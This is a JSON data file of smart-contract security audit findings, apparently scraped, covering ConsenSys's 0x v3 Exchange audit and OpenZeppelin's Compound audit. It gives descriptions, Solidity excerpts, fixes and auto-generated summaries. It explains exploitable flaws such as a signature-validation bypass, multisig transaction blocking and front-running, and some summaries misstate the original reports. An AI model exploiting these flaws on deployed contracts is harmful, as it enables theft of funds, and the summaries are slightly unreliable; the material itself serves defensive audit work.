      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13988",
      "title": "Changing the owners or required confirmations in the AssetProxyOwner can unconfirm a previously confirmed transaction ✓ Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis issue is somewhat inaccurate: `isConfirmed()` breaks out of the loop once it’s found the correct number of confirmations. That means that lowering the number of required confirmations is not a problem.\n\n\nFurther, [0xProject/0x-monorepo#2297](https://github.com/0xProject/0x-monorepo/pull/2297) allows signers to confirm transactions that have already been confirmed.\n\n\nIncreasing signing requirements or changing signers can still unconfirm previously confirmed transactions, but the development team is happy with that behavior.\n\n\n\n\n#### Description\n\n\nOnce a transaction has been confirmed in the `AssetProxyOwner`, it cannot be executed until a lock period has passed. During that time, any change to the number of required confirmations will cause this transaction to no longer be executable.\n\n\nIf the number of required confirmations was *decreased*, then one or more owners will have to revoke their confirmation before the transaction can be executed.\n\n\nIf the number of required confirmations was *increased*, then additional owners will have to confirm the transaction, and when the new required number of confirmations is reached, a new confirmation time will be recorded, and thus the time lock will restart.\n\n\nSimilarly, if an owner that had previously confirmed the transaction is replaced, the number of confirmations will drop for existing transactions, and they will need to be confirmed again.\n\n\nThis is not disastrous, but it’s almost certainly unintended behavior and may make it difficult to make changes to the multisig owners and parameters.\n\n\n#### Examples\n\n\n`executeTransaction()` requires that at the time of execution, the transaction is confirmed:\n\n\n**code/contracts/multisig/contracts/src/AssetProxyOwner.sol:L115-L118**\n\n\n\n```\nfunction executeTransaction(uint256 transactionId)\n    public\n    notExecuted(transactionId)\n    fullyConfirmed(transactionId)\n\n```\n`isConfirmed()` checks for exact equality with the number of required confirmations. Having too many confirmations is just as bad as too few:\n\n\n**code/contracts/multisig/contracts/src/MultiSigWallet.sol:L318-L335**\n\n\n\n```\n/// @dev Returns the confirmation status of a transaction.\n/// @param transactionId Transaction ID.\n/// @return Confirmation status.\nfunction isConfirmed(uint256 transactionId)\n    public\n    view\n    returns (bool)\n{\n    uint256 count = 0;\n    for (uint256 i = 0; i < owners.length; i++) {\n        if (confirmations[transactionId][owners[i]]) {\n            count += 1;\n        }\n        if (count == required) {\n            return true;\n        }\n    }\n}\n\n```\nIf additional confirmations are required to reconfirm a transaction, that resets the time lock:\n\n\n**code/contracts/multisig/contracts/src/MultiSigWalletWithTimeLock.sol:L86-L100**\n\n\n\n```\n/// @dev Allows an owner to confirm a transaction.\n/// @param transactionId Transaction ID.\nfunction confirmTransaction(uint256 transactionId)\n    public\n    ownerExists(msg.sender)\n    transactionExists(transactionId)\n    notConfirmed(transactionId, msg.sender)\n    notFullyConfirmed(transactionId)\n{\n    confirmations[transactionId][msg.sender] = true;\n    emit Confirmation(msg.sender, transactionId);\n    if (isConfirmed(transactionId)) {\n        \\_setConfirmationTime(transactionId, block.timestamp);\n    }\n}\n\n```\n#### Recommendation\n\n\nAs in <https://github.com/ConsenSys/0x-v3-audit-2019-09/issues/39,> the semantics of the original `MultiSigWallet` were that once a transaction is fully confirmed, it’s immediately executed. The time lock means this is no longer possible, but it is possible to *record* that the transaction is confirmed and never allow this to change. In fact, the confirmation time already records this. Once the confirmation time is non-zero, a transaction should always be considered confirmed.",
      "summary": "\nThis bug report discusses an issue with the `AssetProxyOwner` contract, where a transaction cannot be executed until a lock period has passed. The issue is that if the number of required confirmations is changed, the transaction will no longer be executable. This is not disastrous, but it can make it difficult to make changes to the multisig owners and parameters. \n\nThe `executeTransaction()` function requires that the transaction is confirmed at the time of execution, and the `isConfirmed()` function checks for exact equality with the number of required confirmations. If additional confirmations are required to reconfirm a transaction, that resets the time lock.\n\nThe development team has determined that the issue is inaccurate, as `isConfirmed()` breaks out of the loop once it’s found the correct number of confirmations, and [0xProject/0x-monorepo#2297](https://github.com/0xProject/0x-monorepo/pull/2297) allows signers to confirm transactions that have already been confirmed. Increasing signing requirements or changing signers can still unconfirm previously confirmed transactions, but the development team is happy with that behavior.\n\nThe recommendation is that, once the confirmation time is non-zero, a transaction should always be considered confirmed. This way, the semantics of the original `MultiSigWallet` are maintained, where once a transaction is fully confirmed, it’s immediately executed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13987",
      "title": "Orders with signatures that require regular validation can have their validation bypassed if the order is partially filled ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis is fixed in [0xProject/0x-monorepo#2246](https://github.com/0xProject/0x-monorepo/pull/2246). Signatures are now always validated each time, regardless of type.\n\n\n#### Description\n\n\nThe signature types `Wallet`, `Validator`, and `EIP1271Wallet` require explicit validation to authorize each action performed on a given order. This means that if an order was signed using one of these methods, the `Exchange` must perform a validation step on the signature each time the order is submitted for a partial fill. In contrast, the other canonical signature types (`EIP712`, `EthSign`, and `PreSigned`) are only required to be validated by the `Exchange` on the order’s first fill; subsequent fills take the order’s existing fill amount as implicit validation that the order has a valid, published signature.\n\n\nThis re-validation step for `Wallet`, `Validator`, and `EIP1271Wallet` signatures is intended to facilitate their use with contracts whose validation depends on some state that may change over time. For example, a validating contract may call into a price feed and determine that some order is invalid if its price deviates from some expected range. In this case, the repeated validation allows 0x users to make orders with custom fill conditions which are evaluated at run-time.\n\n\nWe found that if the sender provides the contract with an invalid signature after the order in question has already been partially filled, the regular validation check required for `Wallet`, `Validator`, and `EIP1271Wallet` signatures can be bypassed entirely.\n\n\n#### Examples\n\n\nSignature validation takes place in `MixinExchangeCore._assertFillableOrder`. A signature is only validated if it passes the following criteria:\n\n\n**code/contracts/exchange/contracts/src/MixinExchangeCore.sol:L372-L381**\n\n\n\n```\n// Validate either on the first fill or if the signature type requires\n// regular validation.\naddress makerAddress = order.makerAddress;\nif (orderInfo.orderTakerAssetFilledAmount == 0 ||\n    \\_doesSignatureRequireRegularValidation(\n        orderInfo.orderHash,\n        makerAddress,\n        signature\n    )\n) {\n\n```\nIn effect, signature validation only occurs if:\n\n\n* `orderInfo.orderTakerAssetFilledAmount == 0` OR\n* `_doesSignatureRequireRegularValidation(orderHash, makerAddress, signature)`\n\n\nIf an order is partially filled, the first condition will evaluate to false. Then, that order’s signature will only be validated if `_doesSignatureRequireRegularValidation` evaluates to true:\n\n\n**code/contracts/exchange/contracts/src/MixinSignatureValidator.sol:L183-L206**\n\n\n\n```\nfunction \\_doesSignatureRequireRegularValidation(\n    bytes32 hash,\n    address signerAddress,\n    bytes memory signature\n)\n    internal\n    pure\n    returns (bool needsRegularValidation)\n{\n    // Read the signatureType from the signature\n    SignatureType signatureType = \\_readSignatureType(\n        hash,\n        signerAddress,\n        signature\n    );\n\n    // Any signature type that makes an external call needs to be revalidated\n    // with every partial fill\n    needsRegularValidation =\n        signatureType == SignatureType.Wallet ||\n        signatureType == SignatureType.Validator ||\n        signatureType == SignatureType.EIP1271Wallet;\n    return needsRegularValidation;\n}\n\n```\nThe `SignatureType` returned from `_readSignatureType` is directly cast from the final byte of the passed-in signature. Any value that does not cast to `Wallet`, `Validator`, and `EIP1271Wallet` will cause `_doesSignatureRequireRegularValidation` to return false, skipping validation.\n\n\nThe result is that an order whose signature requires regular validation can be forced to skip validation if it has been partially filled, by passing in an invalid signature.\n\n\n#### Recommendation\n\n\nThere are a few options for remediation:\n\n\n1. Have the `Exchange` validate the provided signature every time an order is filled.\n2. Record the first seen signature type or signature hash for each order, and check that subsequent actions are submitted with a matching signature.\n\n\nThe first option requires the fewest changes, and does not require storing additional state. While this does mean some additional cost validating subsequent signatures, we feel the increase in flexibility is well worth it, as a maker could choose to create multiple valid signatures for use across different order books.",
      "summary": "\nThis bug report is about an issue with the 0xProject/0x-monorepo where the signature types Wallet, Validator and EIP1271Wallet require explicit validation to authorize each action performed on a given order. This means that if an order was signed using one of these methods, the Exchange must perform a validation step on the signature each time the order is submitted for a partial fill. In contrast, the other canonical signature types (EIP712, EthSign, and PreSigned) are only required to be validated by the Exchange on the order’s first fill; subsequent fills take the order’s existing fill amount as implicit validation that the order has a valid, published signature.\n\nThe bug was that if the sender provides the contract with an invalid signature after the order in question has already been partially filled, the regular validation check required for Wallet, Validator, and EIP1271Wallet signatures can be bypassed entirely. This was fixed in 0xProject/0x-monorepo#2246, where signatures are now always validated each time, regardless of type.\n\nTo prevent this issue from occurring again, the Exchange can validate the provided signature every time an order is filled, or record the first seen signature type or signature hash for each order, and check that subsequent actions are submitted with a matching signature.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13986",
      "title": "An account that confirms a transaction via AssetProxyOwner can indefinitely block that transaction ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis is fixed in [0xProject/0x-monorepo#2297](https://github.com/0xProject/0x-monorepo/pull/2297) by allowing transactions to be “over confirmed” without resetting the confirmation time. As long as there are enough honest signers, this prevents a malicious signer from blocking transactions.\n\n\n#### Description\n\n\nWhen a transaction reaches the required number of confirmations in `confirmTransaction()`, its confirmation time is recorded:\n\n\n**code/contracts/multisig/contracts/src/MultiSigWalletWithTimeLock.sol:L86-L100**\n\n\n\n```\n/// @dev Allows an owner to confirm a transaction.\n/// @param transactionId Transaction ID.\nfunction confirmTransaction(uint256 transactionId)\n    public\n    ownerExists(msg.sender)\n    transactionExists(transactionId)\n    notConfirmed(transactionId, msg.sender)\n    notFullyConfirmed(transactionId)\n{\n    confirmations[transactionId][msg.sender] = true;\n    emit Confirmation(msg.sender, transactionId);\n    if (isConfirmed(transactionId)) {\n        \\_setConfirmationTime(transactionId, block.timestamp);\n    }\n}\n\n```\nBefore the time lock has elapsed and the transaction is executed, any of the owners that originally confirmed the transaction can revoke their confirmation via `revokeConfirmation()`:\n\n\n**code/contracts/multisig/contracts/src/MultiSigWallet.sol:L249-L259**\n\n\n\n```\n/// @dev Allows an owner to revoke a confirmation for a transaction.\n/// @param transactionId Transaction ID.\nfunction revokeConfirmation(uint256 transactionId)\n    public\n    ownerExists(msg.sender)\n    confirmed(transactionId, msg.sender)\n    notExecuted(transactionId)\n{\n    confirmations[transactionId][msg.sender] = false;\n    emit Revocation(msg.sender, transactionId);\n}\n\n```\nImmediately after, that owner can call `confirmTransaction()` again, which will reset the confirmation time and thus the time lock.\n\n\nThis is especially troubling in the case of a single compromised key, but it’s also an issue for disagreement among owners, where any *m* of the *n* owners should be able to execute transactions but could be blocked.\n\n\n#### Mitigations\n\n\nOnly an owner can do this, and that owner has to be part of the group that originally confirmed the transaction. This means the malicious owner may have to front run the others to make sure they’re in that initial confirmation set.\n\n\nEven once a malicious owner is in position to execute this perpetual delay, they need to call `revokeConfirmation()` and `confirmTransaction()` again each time. Another owner can attempt to front the attacker and execute their own `confirmTransaction()` immediately after the `revokeConfirmation()` to regain control.\n\n\n#### Recommendation\n\n\nThere are several ways to address this, but to best preserve the original `MultiSigWallet` semantics, once a transaction has reached the required number of confirmations, it should be impossible to revoke confirmations. In the original implementation, this is enforced by immediately executing the transaction when the final confirmation is received.",
      "summary": "\nThis bug report is about a vulnerability in the 0xProject/0x-monorepo codebase. The vulnerability is related to the MultiSigWalletWithTimeLock.sol contract, which is used to confirm transactions with a required number of confirmations. The issue is that, before the transaction is executed, any of the owners that originally confirmed the transaction can revoke their confirmation and reset the confirmation time, which could lead to malicious owners blocking transactions. \n\nThe bug has been fixed by allowing transactions to be \"over confirmed\" without resetting the confirmation time. This prevents a malicious signer from blocking transactions as long as there are enough honest signers. \n\nThe recommendation is to enforce that, once a transaction has reached the required number of confirmations, it should be impossible to revoke confirmations. This would prevent malicious owners from blocking transactions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "11837",
      "title": "Partial Refactorization",
      "impact": "LOW",
      "content": "The [`getUtilizationAndAnnualBorrowRate` function](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/WhitePaperInterestRateModel.sol#L70) of the `WhitePaperInterestRateModel` contract appears to be in a partially refactored state. The comments and choice of functions suggest that the [`multiplier` variable](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/WhitePaperInterestRateModel.sol#L20) is represented as a percentage (ie. the value 45 would imply a multiplier of 45%). However, instead of dividing by 100, [it is divided by 1e18](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/WhitePaperInterestRateModel.sol#L88). This is consistent with how the deployed contracts treat the `multiplier` variable. Nevertheless, it uses the functions intended for `uint` values to recreate the [`mulExp`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/Exponential.sol#L141) function without the rounding check.\n\n\nConsider using the `mulExp` function to scale the utilization rate instead of `mulScalar` and `divScalar` and update the comments to describe the correct code behaviour. In addition, consider stating the unit type in the [`multiplier` and `baseRate` comments](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/WhitePaperInterestRateModel.sol#L17-L25).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11836",
      "title": "Truncation-Related Issues",
      "impact": "LOW",
      "content": "Throughout the compound contracts, truncation issues inherent to EVM operation result in some relatively unavoidable errors. These errors exist when minting cTokens, when redeeming cTokens for their underlying assets, and when liquidating another user’s loan.\n\n\nIn the case of minting, the `CToken.mintFresh` function [calls `divScalarByExpTruncate`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L724) to determine the number of cTokens the user will receive given their input of a certain number of underlying tokens. The result will be truncated if it is calculated to be some non-integer number of cToken units.\n\n\nIn the case of redeeming, the `CToken.redeemFresh` function also [calls `divScalarByExpTruncate`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L855). The number of tokens to redeem will similarly be truncated to the next lowest integer value of underlying token units.\n\n\nFinally, the `Comptroller.liquidateCalculateSeizeTokens` function [calls `mulScalarTruncate`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/Comptroller.sol#L767). If the amount repaid is sufficiently small, the result will be rounded down to the next nearest integer value of indivisible token units.\n\n\nIn all cases, the user receives less than they theoretically should (either in terms of cTokens, or in terms of underlying tokens). However, the loss should never be more than 1 indivisible unit of whatever token the user is receiving. Even in the case of wBTC, where 1 indivisible unit is worth the most out of any other token involved, the loss is only roughly 1% of a USD cent (at time of writing). This issue, unlike the issue of interest-free loans, does not hurt the protocol. Instead, the users take the brunt of the (very small) loss.\n\n\nIt should be pointed out that extremely small loans that are able to be liquidated may not actually be liquidated, since truncation could cause the liquidator to receive nothing, or far less than they’d theoretically receive. However, loans that are not liquidated because of this will eventually accrue enough interest that they can be profitably liquidated.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11835",
      "title": "Admin Must Receive Reserves",
      "impact": "LOW",
      "content": "The `CToken` administrator can call the [`_reduceReserves` function](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L1427) to withdraw some of the reserves. However, the function requires that the administrator is the recipient address. This merges roles that should probably be distinct, particularly when the administrator is replaced with a decentralized governance process.\n\n\nConsider having a separate recipient role, or allowing the administrator to choose the recipient in the function call.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11834",
      "title": "cToken Related Issues",
      "impact": "LOW",
      "content": "###### cTokens might not be transferable\n\n\nCurrently cTokens can not be transferred if they are required to collateralize a loan, but there are no functions to check if users’ cTokens are locked. This is not standard ERC20 behaviour and could be confusing to users.  \n\nConsidering adding a related function to check if users’ cTokens are transferable.\n\n\n###### ERC20 double spend race condition\n\n\nDue to `CToken`‘s inheritance of ERC20’s `approve` function, it is vulnerable to the ERC20 approve and double spend front running attack. Briefly, an authorized spender could spend both allowances by front running an allowance-changing transaction. Consider implementing OpenZeppelin’s [`decreaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/token/ERC20/ERC20.sol#L133) and [`increaseAllowance`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts/token/ERC20/ERC20.sol#L114) functions to help mitigate this.\n\n\n###### ERC20 decimals size\n\n\nThe EIP20 specification [optionally defines a `uint8` `decimals` field](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md#decimals). However, the [corresponding field](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L35) in the `CToken` contract is a `uint256`. This is not compliant with the specification and may cause confusion when interacting with wallets and dApps. Consider setting the `decimals` type to `uint8`.\n\n\n###### 0 Address for Mints & Burns\n\n\nAlthough not technically part of the EIP20 specification, it is common practice to use the zero address as the source for all `Transfer` events after minting, and as the destination for `Transfer`s upon burning tokens. The `Transfer` events in functions [`mintFresh`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L766) and [`redeemFresh`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L913) use the address of the `CToken` contract instead. Consider using the zero address instead or informing users and developers of this feature.\n\n\n###### Mixing concerns\n\n\nThe `CToken` contract performs three different categories of functions:  \n\n1. ERC20 operations including transferring tokens, checking balances and setting allowances  \n\n1. Administrative operations such as setting the comptroller, interest rate model and reserve rate  \n\n1. The borrowing, loaning, repaying and liquidating operations as well as their support functions\n\n\nFor simplicity and readability, consider splitting it into multiple contracts with distinct roles.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11833",
      "title": "Excessive Indirection",
      "impact": "MEDIUM",
      "content": "The [`Exponential` contract](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/Exponential.sol) represents a fixed-size decimal number with a `uint` that is scaled up so the smallest non-zero decimal value is internally represented by the number 1. However, it is also unnecessarily wrapped in a struct.\n\n\nThis has the advantage that the scaled values can have a unique Solidity type. On the other hand, this feature is used inconsistently throughout the code base and introduces a very large overhead. Many of the functions in the `Exponential` contract implement common mathematical operations on the `Exp` type when the equivalent functions already exist for the `uint256` type. Most of the functions in the `Exponential` contract could be simplified or eliminated if the additional layer of indirection were removed. Additionally, many operations are complicated by mapping back and forth between the two representations.\n\n\nConsider using the `uint256` type to internally represent the fixed-size decimal numbers. Then, consider enforcing the existing `Mantissa` suffix convention to consistently indicate whether a given variable is scaled.",
      "summary": "\nThe Exponential contract is a feature in Compound Protocol which represents a fixed-size decimal number with a uint that is scaled up so the smallest non-zero decimal value is internally represented by the number 1. This feature is used inconsistently throughout the code base and introduces a large overhead. The report suggests using the uint256 type to internally represent the fixed-size decimal numbers and enforcing the existing Mantissa suffix convention to consistently indicate whether a given variable is scaled. This way, many of the functions in the Exponential contract can be simplified or eliminated and many operations can be simplified by mapping back and forth between the two representations.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11832",
      "title": "Misleading NatSpec Comments",
      "impact": "MEDIUM",
      "content": "Since the purpose of the Ethereum Natural Specification (NatSpec) is to describe the code to the user, misleading statements should be considered a violation of the public API that may confuse or mislead users.\n\n\nThe `getBorrowRate` [interface](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/InterestRateModel.sol#L19) and [implementation](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/WhitePaperInterestRateModel.sol#L113) `@return` comments state that the rate is scaled by 10e18. In fact, it is only scaled by 1e18.\n\n\nThe `CToken` contract [`borrowRateMaxMantissa` comment](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L38) states that the maximum borrow rate per block is 0.0005% but it is actually 0.0005 ( or 0.05% ).\n\n\nThe comment on [line 7 of `Unitroller.sol`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/Unitroller.sol#L7-L8) is an incomplete thought/sentence.\n\n\nThe comment on [line 41 of `ComptrollerStorage.sol`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/ComptrollerStorage.sol#L41) uses the word “discount” when it should use “bonus”, which may cause confusion for people trying to understand the code. For example, a 25% discount is equivalent to a 33% bonus. That is, “25% off” is the same as “33% more for free”.\n\n\nThe comment on [line 6 of `Exponential.sol`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/Exponential.sol#L6) says “fixed-decision” when it should say “fixed-precision”.\n\n\nThe comment on [line 83 of `CToken.sol`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L83) describes `borrowIndex` as the accumulator of earned interest when it should be the accumulator of the earned interest rate.\n\n\nConsider updating the comments appropriately.",
      "summary": "\nThis bug report is about Ethereum Natural Specification (NatSpec). NatSpec is meant to describe code in a way that is understandable to users. In this report, there are several comments that are misleading or incorrect, and they should be updated appropriately. \n\nThe first issue is with the `getBorrowRate` interface and implementation. The comments state that the rate is scaled by 10e18, but it is actually scaled by 1e18. The `CToken` contract comment about the maximum borrow rate per block is also incorrect, as it states 0.0005% when it should be 0.0005 (or 0.05%). \n\nThe comment on line 7 of `Unitroller.sol` is an incomplete thought/sentence. The comment on line 41 of `ComptrollerStorage.sol` uses the word “discount” when it should use “bonus”, as a 25% discount is equivalent to a 33% bonus. The comment on line 6 of `Exponential.sol` says “fixed-decision” when it should say “fixed-precision”. Lastly, the comment on line 83 of `CToken.sol` describes `borrowIndex` as the accumulator of earned interest when it should be the accumulator of the earned interest rate. \n\nIn conclusion, this bug report is about incorrect or misleading comments in the NatSpec code. These comments should be updated to avoid confusion or misleading users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11831",
      "title": "Unsafe Assumptions About Average Time Between Blocks",
      "impact": "MEDIUM",
      "content": "The current implementation of the protocol uses *blocks* rather than *seconds* to measure time between interest accruals. This makes the implementation highly sensitive to changes in the average time between Ethereum blocks.\n\n\nOn [line 30 of `WhitePaperInterestRateModel.sol`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/WhitePaperInterestRateModel.sol#L30) it is implicitly assumed that the time between blocks is 15 seconds. However, the average time between blocks can change dramatically.\n\n\nFor example, the average time between blocks may increase by significant factors due to the difficulty bomb or decrease by significant factors during the transition to Serenity.\n\n\nThe difference between the actual time between blocks and the assumed time between blocks causes proportional differences between the intended interest rates and the actual interest rates.\n\n\nWhile it is possible for the admin to combat this by adjusting the interest rate model when the average time between blocks changes, such adjustments are manual and happen only after-the-fact. Errors in blocktime assumptions are cumulative, and fixing the model after-the-fact does not make users whole – it only prevents incorrect interest calculations moving forward (until the next change in blocktime).\n\n\nConsider refactoring the implementation to use *seconds* rather than *blocks* to measure the time between accruals. While `block.timestamp` can be manipulated by miners within a narrow window, these errors are small and, importantly, are not cumulative. This would decouple the interest rate model from Ethereum’s average blocktime.",
      "summary": "\nThis bug report concerns the current implementation of the protocol, which uses blocks rather than seconds to measure time between interest accruals. This makes the protocol highly sensitive to changes in the average time between Ethereum blocks, which can change significantly due to the difficulty bomb or the transition to Serenity. This difference between the actual time between blocks and the assumed time causes proportional differences between the intended interest rates and the actual interest rates. The bug report suggests refactoring the implementation to use seconds rather than blocks to measure the time between accruals. This would decouple the interest rate model from Ethereum’s average blocktime, and errors would not be cumulative.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11830",
      "title": "Unknown Repayment Amount",
      "impact": "MEDIUM",
      "content": "To repay an ERC20 loan, a borrower can call [`repayBorrow`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CErc20.sol#L86) or [`repayBorrowBehalf`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CErc20.sol#L96) with a specified amount to repay.\n\n\nHowever, they accrue interest in every block, which means if they specify the value of the loan at a particular block, their loan will be slightly higher in a future block when the transaction is confirmed and they will end up leaving part of the loan unpaid.\n\n\nOn the other hand, they could set the repay amount to `uint256(-1)`, which is used as a signal to mean “pay the whole loan”. This prevents the user from setting an upper bound on how much to pay. It is also particularly vulnerable in the case where an address is repaying on behalf of another address, since the borrower could front-run the transaction and borrow additional funds (up to the amount that the message sender has authorized the `CToken` contract to spend), which would also be repaid in the same transaction.\n\n\nConsider treating the specified repayment amount as an upper bound, where the transaction repays the minimum of that value and the size of the loan.",
      "summary": "\nThis bug report is about how to repay an ERC20 loan. The issue is that when a borrower specifies the amount to repay, the loan will be slightly higher in the future when the transaction is confirmed and part of the loan will remain unpaid. To prevent this, the borrower can set the repay amount to `uint256(-1)`, which is used as a signal to mean “pay the whole loan”. However, this is particularly vulnerable in the case where an address is repaying on behalf of another address, as the borrower could front-run the transaction and borrow additional funds. \n\nTo address this issue, it is suggested that the specified repayment amount should be treated as an upper bound, where the transaction repays the minimum of that value and the size of the loan.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11829",
      "title": "Error Propagation",
      "impact": "MEDIUM",
      "content": "The codebase uses an error propagation mechanism that works as follows:\n\n\n* A function that is supposed to return value `X`, instead returns a tuple `(NO_ERROR, X)`\n* A function that would normally error out instead returns a tuple `(ERROR_NAME, 0)`\n* Note that in both cases, the first return value is an error code (an `enum` type named `Error`)\n* Whenever a function returns an error, the calling function has to check it and then bubbles it up (ie. the caller returns the error tuple, possibly adding context to the error message)\n* At the top level, the error/context codes are emitted in an event and then the error code is returned. The transaction is successful.\n* The UI will need to convert the error codes into an error message\n\n\nThis scheme has the benefit of providing useful failure messages when an operation fails. However, there are serious negative properties of this pattern which we discuss below.\n\n\n* First, the error propagation scheme violates the “Fail Early and Loudly” principle. Errors are not trapped when they are found. Callers have to remember to check and handle the returned error codes. Failure to do so can have serious security consequences.\n* The scheme also increases both the size and the complexity of the code base. We estimate that abandoning the current scheme in favor of the traditional require/assert/revert paradigm would reduce the size of the (Solidity) codebase by 40%-60%. This would, additionally, make the code itself easier to read and understand — which is an often overlooked but important property of secure code.\n* The increased code complexity is not just a matter of cognitive overhead for those attempting to read/understand the code. It also results in very large increases in gas costs due to all the extra required opcodes. From the user’s perspective, this is a strong argument against this pattern.\n* Implementation of the scheme makes it incompatible with battle-tested libraries (like SafeMath) and requires the use of custom math functions that reproduce the same functionality except that they return errors instead of throwing on failure.\n* The default value of an uninitialized `Error` enum is the `Error.NO_ERROR` value. This means that if a new `Error` variable is declared and returned by a function without having been set, the caller will assume that there was no error. That is, the default assumption by error handlers is that everything went according to plan. It would be safer to assume, by default, that things did *not* go according to plan unless verified otherwise. While this property is not 